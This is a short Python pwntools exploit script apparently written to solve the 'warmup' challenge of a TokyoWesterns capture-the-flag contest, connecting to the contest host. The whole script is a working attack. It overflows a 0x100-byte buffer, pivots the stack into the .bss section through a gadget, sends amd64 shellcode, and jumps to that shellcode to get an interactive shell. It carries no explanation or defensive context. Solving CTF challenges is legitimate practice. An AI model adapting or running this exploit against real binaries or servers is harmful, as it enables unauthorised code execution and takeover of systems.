from pwn import *

context.arch='amd64'
#r = process('./warmup')
r = remote('nothing.chal.ctf.westerns.tokyo',10001)
#gdb.attach(r)

bss = 0x601060
gadget1 = 0x4006db

payload = 'A' * 0x100 + p64(bss + 0x100) + p64(gadget1)

r.recv()
r.sendline(payload)

sc = asm(shellcraft.sh())
payload = p64(0x400798) + sc.ljust(0x100, 'A') + p64(bss + 0x8)

r.sendline(payload)
r.interactive()
r.close()
